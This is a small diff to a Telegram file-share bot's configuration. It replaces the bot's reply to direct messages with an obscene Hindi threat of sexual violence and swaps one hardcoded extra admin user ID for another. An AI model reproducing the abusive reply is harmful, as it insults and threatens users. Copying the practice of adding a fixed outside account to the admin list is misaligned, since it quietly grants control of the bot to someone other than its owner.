@@ -58,10 +58,10 @@ PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" e
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'
 
 BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
-USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
+USER_REPLY_TEXT = "🤬 ʟᴀᴜᴅᴇ 🍌 ᴍᴀssᴀɢᴇ ᴍᴀᴛ ᴋᴀʀ. ʙᴀʀɴᴀ ʙᴀᴛ 🏏 ᴋᴀ ɢʀɪᴘ ᴛᴇʀᴇ ɢᴀɴᴅ 🍑 ᴍᴇ ᴅᴀᴀʟ 👌👈 ᴅᴜɴɢᴀ!"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1250450587)
+ADMINS.append(6004385980)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
